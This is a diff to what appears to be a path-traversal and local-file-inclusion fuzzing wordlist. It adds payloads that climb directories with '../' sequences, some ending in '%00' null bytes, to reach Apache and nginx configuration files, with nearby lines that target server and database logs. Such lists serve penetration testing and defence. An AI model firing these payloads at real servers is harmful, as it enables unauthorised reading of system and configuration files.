@@ -42,6 +42,12 @@
 ../../../../../../../../../../apache/logs/error%00
 /apache/logs/error.log%00
 /apache/logs/error%00
+/etc/apache2/apache2.conf
+../../../../../../../../../../etc/apache2/apache2.conf
+../../../../../../../../../../etc/apache2/apache2.conf%00
+/usr/local/etc/apache22/httpd.conf
+../../../../../../../../../../usr/local/etc/apache22/httpd.conf
+../../../../../../../../../../usr/local/etc/apache22/httpd.conf%00
 ../../../../../../../../../../etc/apache2/conf/httpd.conf
 ../../../../../../../../../../logs/access.log
 ../../../../../../../../../../logs/access
@@ -368,6 +374,12 @@
 ../../../../../../../../../../var/log/mysql/mysql-slow%00
 /var/log/mysql/mysql-slow.log%00
 /var/log/mysql/mysql-slow%00
+/etc/nginx/sites-available/default
+/etc/apache2/sites-available/000-default.conf
+../../../../../../../../../../etc/apache2/sites-available/000-default.conf
+/etc/apache2/sites-available/default-ssl.conf
+../../../../../../../../../../etc/apache2/sites-available/default-ssl.conf
+../../../../../../../../../../etc/nginx/sites-available/default
 ../../../../../../../../../../var/log/nginx/access.log
 ../../../../../../../../../../var/log/nginx/access
 ../../../../../../../../../../var/log/nginx/access_log
